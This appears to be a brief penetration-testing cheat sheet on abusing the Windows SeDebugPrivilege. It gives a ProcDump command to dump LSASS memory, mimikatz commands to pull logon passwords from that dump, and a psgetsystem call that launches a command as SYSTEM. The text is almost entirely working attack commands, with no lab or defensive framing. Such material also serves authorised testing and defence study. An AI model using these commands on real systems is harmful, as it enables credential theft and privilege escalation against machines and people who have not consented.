# SeDebugPrivilege

## Creds

Use ProcDump to dump lsass:

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

* Then load it into mimikatz with following commands:
  * `log`
  * `sekurlsa::minidump lsass.dmp`
  * `sekurlsa::logonpasswords` Can also manually create dump file from task manager

## RCE

Use [psgetsystem](https://github.com/decoder-it/psgetsystem)

```
[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```
